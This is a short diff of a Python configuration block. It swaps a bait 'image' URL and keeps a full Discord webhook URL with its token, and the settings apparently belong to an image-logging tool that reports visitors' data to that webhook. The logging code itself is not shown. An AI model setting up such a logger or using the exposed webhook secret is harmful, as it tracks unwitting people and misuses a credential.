@@ -11,7 +11,7 @@ __author__ = "cabdio"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1442962836769738873/H0Laz5ORaL_q5UH2MlHHAEANMXnBe3cy1gNcd2Fz-d98dRPCmdXFIwy9ELrQ3iRx9nJt",
-    "image": "https://www.bing.com/images/search?view=detailV2&ccid=43Z9IeWB&id=61361796522532CBAF066B86263FFE44E56DFA56&thid=OIP.43Z9IeWBXK0n8nBANA5kKQHaEK&mediaurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.e3767d21e5815cad27f27040340e6429%3frik%3dVvpt5UT%252bPyaGaw%26riu%3dhttp%253a%252f%252fhdqwalls.com%252fwallpapers%252fbatman-begins-4k-rn.jpg%26ehk%3dLfNTVJziJUT58WaE8z2cqHsTfqapSxolwENhNybpyt0%253d%26risl%3d1%26pid%3dImgRaw%26r%3d0&exph=2443&expw=4343&q=batman+jpg&FORM=IRPRST&ck=C9B486A4221953A2B4106811A5A598C7&selectedIndex=8&itb=0", 
+    "image": "https://cdn.discordapp.com/icons/1442962439829327925/370e65335ed7de4eee241263b2bbe362.png?size=512", 
     "imageArgument": True,
 
     "username": "Made by KrayZN", 
